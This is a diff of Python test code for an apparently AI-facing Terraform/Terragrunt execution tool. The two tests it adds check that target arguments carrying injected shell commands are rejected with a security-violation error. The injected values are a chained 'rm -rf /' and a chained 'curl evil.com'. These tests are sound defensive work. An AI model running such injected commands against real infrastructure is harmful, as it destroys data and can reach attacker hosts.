@@ -540,3 +540,47 @@ async def test_execute_terragrunt_command_error(temp_terraform_dir):
     assert result.return_code == 1
     assert result.stdout is not None and 'Error running terragrunt' in result.stdout
     assert 'Failed to initialize terragrunt' in result.stderr
+
+
+@pytest.mark.asyncio
+async def test_execute_terraform_command_dangerous_targets(temp_terraform_dir):
+    """Test the Terraform command execution with dangerous patterns in targets."""
+    request = TerraformExecutionRequest(
+        command='plan',
+        working_directory=temp_terraform_dir,
+        variables=None,
+        aws_region='us-west-2',
+        strip_ansi=True,
+        targets=['aws_instance.web; rm -rf /'],
+    )
+
+    result = await execute_terraform_command_impl(request)
+
+    assert result is not None
+    assert result.status == 'error'
+    assert result.error_message is not None and 'Security violation' in result.error_message
+    assert 'targets' in result.error_message
+
+
+@pytest.mark.asyncio
+async def test_execute_terragrunt_command_dangerous_targets(temp_terraform_dir):
+    """Test the Terragrunt command execution with dangerous patterns in targets."""
+    request = TerragruntExecutionRequest(
+        command='apply',
+        working_directory=temp_terraform_dir,
+        variables=None,
+        aws_region='us-west-2',
+        strip_ansi=True,
+        targets=['module.vpc && curl evil.com'],
+        include_dirs=None,
+        exclude_dirs=None,
+        run_all=False,
+        terragrunt_config=None,
+    )
+
+    result = await execute_terragrunt_command_impl(request)
+
+    assert result is not None
+    assert result.status == 'error'
+    assert result.error_message is not None and 'Security violation' in result.error_message
+    assert 'targets' in result.error_message
